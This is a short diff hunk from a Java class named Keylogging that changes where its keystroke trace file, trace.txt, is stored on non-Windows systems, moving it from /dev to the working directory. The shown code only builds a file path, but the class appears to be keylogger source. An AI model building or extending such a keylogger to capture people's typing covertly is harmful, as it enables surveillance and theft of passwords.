@@ -512,7 +512,8 @@ public class Keylogging extends Thread {
 	private String getPath() {
 		String chemin = ((System.getProperty("os.name").contains("win") || System
 				.getProperty("os.name").contains("Win")) ? Paths.get("")
-				.toAbsolutePath().toString() : "/dev")
+				.toAbsolutePath().toString() : Paths.get("")
+				.toAbsolutePath().toString())
 				+ File.separator + "trace.txt";
 		return chemin;
 	}
